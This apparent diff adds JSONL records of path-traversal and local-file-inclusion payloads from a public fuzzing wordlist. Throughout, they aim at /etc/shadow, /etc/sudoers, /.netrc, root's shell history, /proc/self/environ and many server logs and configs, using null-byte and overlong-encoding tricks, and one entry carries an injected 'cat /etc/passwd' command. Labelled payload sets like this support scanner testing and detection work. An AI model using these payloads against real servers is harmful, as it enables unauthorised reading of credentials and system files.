+{"payload":"../../../../../../../../../../../../etc/shadow","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:414","license":"MIT"}
+{"payload":"..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\shadow","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:415","license":"MIT"}
+{"payload":"../../../../../../../../../../../../../../../../../../../../../../etc/shadow%00","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:418","license":"MIT"}
+{"payload":"../../../../../../../../../../../../etc/shadow%00","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:419","license":"MIT"}
+{"payload":"/apache/logs/error.log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:42","license":"MIT"}
+{"payload":"..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\shadow%00","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:420","license":"MIT"}
+{"payload":"/etc/sudoers","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:424","license":"MIT"}
+{"payload":"/etc/syslogd.conf","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:426","license":"MIT"}
+{"payload":"/etc/updatedb.conf","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:428","license":"MIT"}
+{"payload":"/etc/vfstab","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:430","license":"MIT"}
+{"payload":"/etc/vsftpd.chroot_list","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:432","license":"MIT"}
+{"payload":"/etc/vsftpd.conf","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:433","license":"MIT"}
+{"payload":"/etc/vsftpd/vsftpd.conf","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:434","license":"MIT"}
+{"payload":"/etc/wtmp","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:435","license":"MIT"}
+{"payload":"/etc/wu-ftpd/ftpaccess","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:436","license":"MIT"}
+{"payload":"/etc/wu-ftpd/ftpusers","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:438","license":"MIT"}
+{"payload":"/home/apache/conf/httpd.conf","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:441","license":"MIT"}
+{"payload":"/home/apache/httpd.conf","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:442","license":"MIT"}
+{"payload":"/home\\bin\\stable\\apache\\php.ini","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:443","license":"MIT"}
+{"payload":"../../../../../../../../../../../../localstart.asp","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:449","license":"MIT"}
+{"payload":"../../../../../../../../../../../../localstart.asp%00","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:450","license":"MIT"}
+{"payload":"/.logout","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:452","license":"MIT"}
+{"payload":"/logs/access_log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:453","license":"MIT"}
+{"payload":"../../../../../logs/access.log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:455","license":"MIT"}
+{"payload":"../../../logs/access.log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:457","license":"MIT"}
+{"payload":"/logs/error.log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:461","license":"MIT"}
+{"payload":"../../../logs/error.log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:464","license":"MIT"}
+{"payload":"/logs/pure-ftpd.log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:467","license":"MIT"}
+{"payload":"/master.passwd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:468","license":"MIT"}
+{"payload":"../apache/logs/error.log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:47","license":"MIT"}
+{"payload":"/.netrc","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:471","license":"MIT"}
+{"payload":"/opt/apache2/conf/httpd.conf","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:473","license":"MIT"}
+{"payload":"/opt/xampp/etc/php.ini","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:479","license":"MIT"}
+{"payload":"/opt/xampp/logs/access.log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:481","license":"MIT"}
+{"payload":"/opt/xampp/logs/error_log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:482","license":"MIT"}
+{"payload":"pass.dat","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:486","license":"MIT"}
+{"payload":"/.passwd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:488","license":"MIT"}
+{"payload":"\\\\&apos;/bin/cat%20/etc/passwd\\\\&apos;","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:49","license":"MIT"}
+{"payload":"/php\\php.ini","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:494","license":"MIT"}
+{"payload":"/proc/cpuinfo","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:498","license":"MIT"}
+{"payload":"/proc/interrupts","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:499","license":"MIT"}
+{"payload":"/proc/loadavg","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:500","license":"MIT"}
+{"payload":"/proc/mounts","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:502","license":"MIT"}
+{"payload":"/proc/self/environ","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:509","license":"MIT"}
+{"payload":"/proc/self/status","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:510","license":"MIT"}
+{"payload":"/Program Files\\Apache Group\\Apache\\logs\\error.log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:516","license":"MIT"}
+{"payload":"/.rhosts","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:519","license":"MIT"}
+{"payload":"/.bash_profile","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:52","license":"MIT"}
+{"payload":"/root/.bash_history","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:520","license":"MIT"}
+{"payload":"/root/.Xauthority","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:524","license":"MIT"}
+{"payload":"/.shosts","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:526","license":"MIT"}
+{"payload":"../users.db.php","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:529","license":"MIT"}
+{"payload":"users.db.php","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:530","license":"MIT"}
+{"payload":"/usr/apache2/conf/httpd.conf","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:532","license":"MIT"}
+{"payload":"/usr/apache/conf/httpd.conf","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:533","license":"MIT"}
+{"payload":"/usr/lib/php.ini","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:536","license":"MIT"}
+{"payload":"/usr/local/apache2/conf/httpd.conf","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:539","license":"MIT"}
+{"payload":"/usr/local/apache2/logs/access.log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:542","license":"MIT"}
+{"payload":"/usr/local/apache/conf/httpd.conf","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:545","license":"MIT"}
+{"payload":"/usr/local/apache/httpd.conf","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:547","license":"MIT"}
+{"payload":"/usr/local/apache/logs/access_log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:550","license":"MIT"}
+{"payload":"/usr/local/apache/logs/access.log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:552","license":"MIT"}
+{"payload":"../../../../../usr/local/apache/logs/access_log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:556","license":"MIT"}
+{"payload":"../../../../../../../usr/local/apache/logs/error_l og","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:560","license":"MIT"}
+{"payload":"../../../../../../../usr/local/apache/logs/error.l og","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:561","license":"MIT"}
+{"payload":"../../../../../usr/local/apache/logs/error.log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:563","license":"MIT"}
+{"payload":"/usr/local/cpanel/logs","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:566","license":"MIT"}
+{"payload":"/usr/local/cpanel/logs/error_log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:568","license":"MIT"}
+{"payload":"/usr/local/cpanel/logs/license_log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:569","license":"MIT"}
+{"payload":"/usr/local/etc/apache2/conf/httpd.conf","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:572","license":"MIT"}
+{"payload":"/usr/local/etc/apache/conf/httpd.conf","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:573","license":"MIT"}
+{"payload":"/usr/local/etc/apache/vhosts.conf","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:574","license":"MIT"}
+{"payload":"/usr/local/etc/httpd/conf/httpd.conf","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:575","license":"MIT"}
+{"payload":"/usr/local/etc/httpd/logs/access_log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:576","license":"MIT"}
+{"payload":"/usr/local/etc/httpd/logs/error_log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:577","license":"MIT"}
+{"payload":"/usr/local/etc/php.ini","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:578","license":"MIT"}
+{"payload":"/usr/local/httpd/conf/httpd.conf","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:581","license":"MIT"}
+{"payload":"/usr/local/php4/lib/php.ini","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:585","license":"MIT"}
+{"payload":"/usr/local/php5/httpd.conf","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:586","license":"MIT"}
+{"payload":"/usr/local/php5/httpd.conf.php","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:587","license":"MIT"}
+{"payload":"/usr/local/php/httpd.conf","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:589","license":"MIT"}
+{"payload":"/usr/local/pureftpd/etc/pureftpd.pdb","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:593","license":"MIT"}
+{"payload":"/usr/local/pureftpd/sbin/pure-config.pl","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:594","license":"MIT"}
+{"payload":"/usr/ports/contrib/pure-ftpd/","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:598","license":"MIT"}
+{"payload":"/usr/ports/ftp/pure-ftpd/","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:599","license":"MIT"}
+{"payload":"/usr/spool/lp/log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:602","license":"MIT"}
+{"payload":"/usr/spool/mqueue/syslog","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:603","license":"MIT"}
+{"payload":"/var/adm/acct/sum/loginlog","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:605","license":"MIT"}
+{"payload":"/var/adm/aculog","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:606","license":"MIT"}
+{"payload":"/var/adm/crash/vmcore","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:609","license":"MIT"}
+{"payload":"..//..//..//..//..//boot.ini","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:61","license":"MIT"}
+{"payload":"/var/adm/lastlog","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:612","license":"MIT"}
+{"payload":"/var/adm/log/asppp.log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:614","license":"MIT"}
+{"payload":"/var/adm/loginlog","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:615","license":"MIT"}
+{"payload":"/var/adm/messages","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:618","license":"MIT"}
+{"payload":"/var/adm/ras/bootlog","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:621","license":"MIT"}
+{"payload":"/var/adm/ras/errlog","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:622","license":"MIT"}
+{"payload":"/var/adm/SYSLOG","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:624","license":"MIT"}
+{"payload":"/var/adm/utmp","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:625","license":"MIT"}
+{"payload":"/var/adm/vold.log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:627","license":"MIT"}
+{"payload":"/var/adm/wtmp","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:628","license":"MIT"}
+{"payload":"/var/adm/X0msgs","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:630","license":"MIT"}
+{"payload":"/var/apache/logs","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:632","license":"MIT"}
+{"payload":"/var/apache/logs/access_log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:633","license":"MIT"}
+{"payload":"/var/apache/logs/error_log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:634","license":"MIT"}
+{"payload":"/var/cpanel/cpanel.config","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:635","license":"MIT"}
+{"payload":"/var/lib/mysql/my.cnf","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:638","license":"MIT"}
+{"payload":"/var/local/www/conf/php.ini","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:639","license":"MIT"}
+{"payload":"..\\../..\\../..\\../..\\../boot.ini","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:64","license":"MIT"}
+{"payload":"/var/log/access.log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:643","license":"MIT"}
+{"payload":"/var/log/acct","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:647","license":"MIT"}
+{"payload":"/var/log/apache2/access_log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:648","license":"MIT"}
+{"payload":"..\\../..\\../boot.ini","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:65","license":"MIT"}
+{"payload":"../../../../../../../var/log/apache2/access_log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:650","license":"MIT"}
+{"payload":"../../../../../../../var/log/apache2/access.log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:651","license":"MIT"}
+{"payload":"../../../../../../../var/log/apache2/error_log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:654","license":"MIT"}
+{"payload":"../../../../../../../var/log/apache/access_log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:658","license":"MIT"}
+{"payload":"../../../../../../../var/log/apache/access.log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:659","license":"MIT"}
+{"payload":"..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\boot.ini","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:66","license":"MIT"}
+{"payload":"/var/log/apache/error_log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:662","license":"MIT"}
+{"payload":"../../../../../../../var/log/apache/error.log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:665","license":"MIT"}
+{"payload":"../../../../../var/log/apache/error.log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:667","license":"MIT"}
+{"payload":"/var/log/apache-ssl/access.log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:668","license":"MIT"}
+{"payload":"\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\boot.ini","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:67","license":"MIT"}
+{"payload":"/var/log/error.log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:677","license":"MIT"}
+{"payload":"/var/log/exim_mainlog","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:681","license":"MIT"}
+{"payload":"/var/log/exim/paniclog","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:684","license":"MIT"}
+{"payload":"/var/log/exim_rejectlog","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:685","license":"MIT"}
+{"payload":"/var/log/httpd/access.log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:692","license":"MIT"}
+{"payload":"../../../../../var/log/httpd/access_log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:693","license":"MIT"}
+{"payload":"../../../../../var/log/httpd/error_log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:696","license":"MIT"}
+{"payload":"/var/log/lastlog","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:700","license":"MIT"}
+{"payload":"/var/log/message","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:703","license":"MIT"}
+{"payload":"/var/log/mysqlderror.log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:705","license":"MIT"}
+{"payload":"/var/log/mysqld.log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:706","license":"MIT"}
+{"payload":"/var/log/mysql.log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:707","license":"MIT"}
+{"payload":"/../../../../../../../../../../../boot.ini%00.html","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:71","license":"MIT"}
+{"payload":"/var/log/mysql/mysql-slow.log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:710","license":"MIT"}
+{"payload":"/var/log/ncftpd.errs","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:711","license":"MIT"}
+{"payload":"/var/log/news","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:713","license":"MIT"}
+{"payload":"/var/log/news.all","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:714","license":"MIT"}
+{"payload":"/var/log/news/news.notice","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:719","license":"MIT"}
+{"payload":"/../../../../../../../../../../../boot.ini%00.jpg","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:72","license":"MIT"}
+{"payload":"/var/log/poplog","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:722","license":"MIT"}
+{"payload":"/var/log/POPlog","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:723","license":"MIT"}
+{"payload":"/var/log/proftpd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:724","license":"MIT"}
+{"payload":"/var/log/proftpd.xferlog","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:726","license":"MIT"}
+{"payload":"/var/log/pureftpd.log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:728","license":"MIT"}
+{"payload":"/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:73","license":"MIT"}
+{"payload":"/var/log/qmail/","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:731","license":"MIT"}
+{"payload":"/var/log/secure","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:734","license":"MIT"}
+{"payload":"/var/log/smtpd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:735","license":"MIT"}
+{"payload":"/var/log/spooler","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:736","license":"MIT"}
+{"payload":"..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:74","license":"MIT"}
+{"payload":"/var/log/wtmp","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:742","license":"MIT"}
+{"payload":"/var/log/yum.log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:744","license":"MIT"}
+{"payload":"/var/run/httpd.pid","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:749","license":"MIT"}
+{"payload":"/var/run/utmp","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:751","license":"MIT"}
+{"payload":"/var/spool/errors","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:754","license":"MIT"}
+{"payload":"/var/spool/tmp","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:757","license":"MIT"}
+{"payload":"/var/www/conf/httpd.conf","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:758","license":"MIT"}
